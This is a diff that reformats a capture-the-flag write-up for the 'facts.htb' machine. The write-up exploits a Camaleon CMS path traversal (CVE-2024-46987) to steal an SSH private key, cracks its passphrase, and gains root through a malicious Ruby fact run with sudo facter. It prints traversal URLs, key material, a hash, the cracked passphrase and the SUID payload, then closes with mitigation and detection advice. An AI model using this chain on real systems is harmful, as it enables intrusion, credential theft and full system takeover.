@@ -32,8 +32,10 @@ tags:
 ## Step 1 - Reconnaissance
 
 ```bash
-nmap -A -sS -P -T4  --min-rate 5000 10.129.18.88 
+nmap -A -sS -P -T4  --min-rate 5000 10.129.18.88
+```
 
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-01 13:20 UTC
 
 Nmap scan report for 10.129.18.88
@@ -118,13 +120,13 @@ Nmap done: 1 IP address (1 host up) scanned in 41.11 seconds
 
 [*] While searching for Known Vulnerabilities for this Version of camaleon, i got one  CVE-2024-46987.
 
-&nbsp;CVE-2024-46987 Camaleon CMS vulnerable to arbitrary path traversal (GHSL-2024-183):-is an authenticated path traversal vulnerability in Camaleon CMS (Content Management System) that allows authenticated users to download arbitrary files from the web server via the download_private_file method in the MediaController.
+ CVE-2024-46987 Camaleon CMS vulnerable to arbitrary path traversal (GHSL-2024-183):-is an authenticated path traversal vulnerability in Camaleon CMS (Content Management System) that allows authenticated users to download arbitrary files from the web server via the download_private_file method in the MediaController.
 
 The vulnerability exists in the file download functionality where user-supplied input is not properly sanitized before being used to construct file paths. The application fails to validate or restrict file paths, allowing directory traversal sequences (../) to escape the intended directory.
 
 Vulnerable endpoints--> GET /admin/media/download_private_file?file=[PATH]
 
-&nbsp;		       POST /admin/media/download_private_file?file=[PATH]
+ 		       POST /admin/media/download_private_file?file=[PATH]
 
 [*] Now Lets try to get the /etc/passwd file 
 
@@ -204,17 +206,13 @@ _laurel:x:101:988::/var/log/laurel:/bin/false
 
 [*] So Lets try to look for some Standard SSH Key Locations for user trivia
 
---------COMMON SSH KEYS -----------------
-
-~/.ssh/id_rsa          # RSA key (most common)
-
-~/.ssh/id_dsa          # DSA key (older)
-
-~/.ssh/id_ecdsa        # ECDSA key
-
-~/.ssh/id_ed25519      # Ed25519 key (modern, recommended)
-
-~/.ssh/identity        # Old format
+> [!NOTE]
+> **Common SSH Key Locations:**
+> - `~/.ssh/id_rsa` — RSA key (most common)
+> - `~/.ssh/id_dsa` — DSA key (older)
+> - `~/.ssh/id_ecdsa` — ECDSA key
+> - `~/.ssh/id_ed25519` — Ed25519 key (modern, recommended)
+> - `~/.ssh/identity` — Old format
 
 [*] When you try each one of them, then you'll see that there is a Ed25519 key is present at 
 
@@ -297,11 +295,15 @@ x-runtime: 0.043868
 [*] Bingo!, in the response we got the SSH PRIVATE KEY
 
 [*] Now lets copy it and save it in our machine
+```
 
+```bash
 cat trivia-key
 
 -----BEGIN OPENSSH PRIVATE KEY-----
+```
 
+```text
 b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAnXzvaCZ
 
 b6GIaREchzJyirAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIMuZCL88vG9NZvw+
@@ -326,10 +328,14 @@ p5lIrwB4gCM61rBNUZRFpHMS26GpRCkP62tlU=
 
 [*] Convert the key into hash with 
 
-/usr/share/john/ssh2john.py trivia-key > trivia_key.hash 
+/usr/share/john/ssh2john.py trivia-key > trivia_key.hash
+```
 
-cat trivia_key.hash 
+```bash
+cat trivia_key.hash
+```
 
+```text
 trivia-key:$sshng$6$16$275f3bda0996fa18869111c8732728ab$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010275f3bda0996fa18869111c8732728ab0000001800000001000000330000000b7373682d6564323535313900000020cb9908bf3cbc6f4d66fc3ee17a79e18dfcf5b2295b5c7dbf2307bb935c729252000000a0dca6f1b9413c4cb5b57e1bb642b37a39fd6d1994871867593e9fb5957861d66d5eac53545cc0c3ab1835f354fda280c752f90f0d55bdda186f725d77522be653d893c0a64225b5c9f995a5c64e2220f8fdbacdc764c620f399e8ff7ea1cba15e7b5eeb16518e67d96343cb84b44fde6b1cf8e94b0c3b0557b2582c71e0635c3b5d62d3f3fa79948af007880233ad6b04d519445a47312dba1a944290feb6b655$24$130
 
 [*] We have converted the key into hash, now lets decrypt it 
@@ -359,76 +365,90 @@ Session completed.
 [*] Got the passphrase "**dragonballz**" 
 
 [*] Now lets Acquire the shell
+```
 
+```bash
 ssh -i trivia-key trivia@facts.htb
+```
 
+```text
 Enter passphrase for key 'trivia-key': 
 
 Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
 
 Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
 
-&nbsp;* Documentation:  https://help.ubuntu.com
+ * Documentation:  https://help.ubuntu.com
 
-&nbsp;* Management:     https://landscape.canonical.com
+ * Management:     https://landscape.canonical.com
 
-&nbsp;* Support:        https://ubuntu.com/pro
+ * Support:        https://ubuntu.com/pro
 
-&nbsp;System information as of Sun Feb  1 05:12:59 PM UTC 2026
+ System information as of Sun Feb  1 05:12:59 PM UTC 2026
 
-&nbsp; System load:           0.0
+  System load:           0.0
 
-&nbsp; Usage of /:            72.9% of 7.28GB
+  Usage of /:            72.9% of 7.28GB
 
-&nbsp; Memory usage:          19%
+  Memory usage:          19%
 
-&nbsp; Swap usage:            0%
+  Swap usage:            0%
 
-&nbsp; Processes:             221
+  Processes:             221
 
-&nbsp; Users logged in:       1
+  Users logged in:       1
 
-&nbsp; IPv4 address for eth0: 10.129.18.88
+  IPv4 address for eth0: 10.129.18.88
 
-&nbsp; IPv6 address for eth0: dead:beef::250:56ff:feb0:1d87
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:1d87
 
 0 updates can be applied immediately.
+```
 
-trivia@facts:~$ 
+```bash
+trivia@facts:~$
+```
 
+```text
 (Note:- remember i told you to make two copies of the private_key, now here use the original private key that we have acquired from the burpsuite request)
 
 [*] Go get the flag
+```
 
+```bash
 trivia@facts:/home/william$ ls
+```
 
+```text
 user.txt
 
 [*] Or if you wanna get the user-flag directly without getting the shell, you can do it by 
 
 **http://target/admin/media/download_private_file?file=../../../../home/william/user.txt**
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
-## Step 3 - Post Exploitation
+## Step 3 - Privilege Escalation
 
 ```text
 [*] Lets look what trivia got for us
+```
 
+```bash
 trivia@facts:/home/william$ sudo -l
+```
 
+```text
 Matching Defaults entries for trivia on facts:
 
-&nbsp;   env_reset, mail_badpass,
+    env_reset, mail_badpass,
 
-&nbsp;   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
 
-&nbsp;   use_pty
+    use_pty
 
 User trivia may run the following commands on facts:
 
-&nbsp;   (ALL) NOPASSWD: /usr/bin/facter
+    (ALL) NOPASSWD: /usr/bin/facter
 
 [*] What is Facter?
 
@@ -436,46 +456,65 @@ Facter is a tool from Puppet (configuration management) that collects and displa
 
 [*]Facter can load external facts from directories. If we can write to a directory that facter checks, we can execute code. 
 
-[*] Lets create a Directory first 
+[*] Lets create a Directory first
+```
 
+```bash
 mkdir -p /tmp/facts
+```
 
+```text
 [*] Fecter will accept ruby files, so we need to put ruby code for the /bin/bash
+```
 
+```bash
 cat > /tmp/facts/exploit.rb << 'EOF'
 
 Facter.add('root_exploit') do
 
-&nbsp; setcode do
+  setcode do
 
-&nbsp;   # Execute commands as root
+    # Execute commands as root
 
-&nbsp;   system('chmod +s /bin/bash')
+    system('chmod +s /bin/bash')
 
-&nbsp;   system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
+    system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
 
-&nbsp;   'done'
+    'done'
 
-&nbsp; end
+  end
 
 end
 
 EOF
+```
 
-[*] Now pawn the bash
+- 🔍 *Now execute Facter pointing to our custom directory, then spawn the SUID bash shell to spawn root:*
 
-trivia@facts:/home/william$ bash -p
+```bash
+sudo facter --custom-dir=/tmp/facts
+```
 
+```bash
+bash -p
+```
+
+```text
 bash-5.2# id
 
 uid=1000(trivia) gid=1000(trivia) euid=0(root) groups=1000(trivia)
 
 [*] Lets Get the Root Flag
+```
 
+```bash
 cat /root/root.txt
+```
 
+```text
 ********************************************************************************************************************************************************************************************
 ```
+
 
 ## Mitigations & Security Perspective
 
@@ -516,4 +555,3 @@ cat /root/root.txt
 > - **Remediation:** Remove `/usr/bin/facter` from the sudoers configuration entirely. If Facter must run with root permissions, call it through restricted scripts that do not permit arbitrary directory arguments (`--custom-dir` or `--external-dir`).
 > - **Remediation:** If the command must remain in sudoers, configure `sudoers` to restrict environment inheritance and restrict options.
 > - **Detection:** Alert on any administrative Facter executions utilizing custom or temp directory options (`--custom-dir`, `--external-dir`, or setting `FACTERLIB`).
-
